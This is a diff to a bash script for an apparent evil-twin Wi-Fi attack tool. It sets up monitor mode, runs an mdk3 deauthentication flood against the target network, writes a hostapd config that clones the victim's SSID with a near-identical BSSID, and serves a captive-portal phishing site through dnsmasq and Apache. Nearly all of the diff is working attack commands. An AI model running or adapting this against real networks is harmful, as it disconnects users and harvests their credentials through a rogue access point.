@@ -1,5 +1,29 @@
+airmon-ng stop mon0
+airmon-ng stop wlan0mon
+airmon-ng stop wlan0
+iw dev wlan0 interface add mon0 type monitor
+rm -R partial
+crdir=$(pwd)
+echo $crdir
+cd site
+pwd
+ls
+rm -r generate_204
+mkdir generate_204
+cd $crdir
+mkdir partial
+sleep 1
+cp -R site/ partial/
+cd partial
+cd site
+rm -r generate_204
+cd $crdir
+cp -a partial/site/. site/generate_204
 cp -R site/. /var/www/html
+sleep 1;
 sudo killall -9 dnsmasq
+sudo killall -9 hostapd
+rm -r partial
 clear;
 white="\033[1;37m"
 grey="\033[0;37m"
@@ -102,8 +126,8 @@ chmod +x dmon.sh
                 echo -e "\e[1;32mOK!"$transparent""
         fi
         sleep 0.025
-    echo -ne "mdk3.............."
-        if ! hash mdk3 2>/dev/null; then
+    echo -ne "mdk4.............."
+        if ! hash mdk4 2>/dev/null; then
                 echo -e "\e[1;31mNot installed"$transparent""
                 exit=1
         else
@@ -189,12 +213,19 @@ echo "$rev"
 modbssid="${bssid/$last/$rev}"
 sleep 1;
 echo "Modified BSSID: "$modbssid
-xterm -fg '#00ff00' -bg '#151519' -fn 6x10 -geometry 80x30-0-0 -title 'DeauTH ALL' -e 'mdk3 '$suc' d -c '$channel &
-xterm -fg '#ffff00' -bg '#151519' -fn 6x10 -geometry 80x30+0+0 -title 'Fake AP' -e 'escaped="$(cat tmp/currssid.txt)"; echo "$escaped"; airbase-ng -a '$modbssid' -e "$escaped" -c '$fakechan' '$suc'; sleep 999999999999999;' &
+echo $bssid > tmp/blacklist.txt
+xterm -fg '#00ff00' -bg '#151519' -fn 6x10 -geometry 80x30-0-0 -title 'DeauTH ALL' -e 'mdk3 '$suc' d -b tmp/blacklist.txt -c '$channel'; sleep 99999999999999;' &
+echo "
+interface=wlan0
+driver=nl80211
+ssid="$ssid"
+bssid="$modbssid"
+channel="$channel > conf/hostapd.conf
+xterm -fg '#ffff00' -bg '#151519' -fn 6x10 -geometry 80x30+0+0 -title 'Fake AP' -e 'hostapd conf/hostapd.conf; sleep 999999999999999;' &
 dnsloc="$(cat conf/current.txt)"
 sleep 1;
 xterm -fg '#00ffff' -bg '#151519' -fn 6x10 -geometry 80x30-0+0 -title 'DNSMASQ' -e '
-ifconfig at0 10.0.0.1/24 up; sleep 1;
+ifconfig wlan0 10.0.0.1/24 up; sleep 1;
 echo '$dnsloc';
 dnsmasq -C '$dnsloc' -d;' &
 xterm -fg '#ff1493' -bg '#151519' -fn 6x10 -geometry 80x30+0-0 -title 'APACHE2 START' -e '
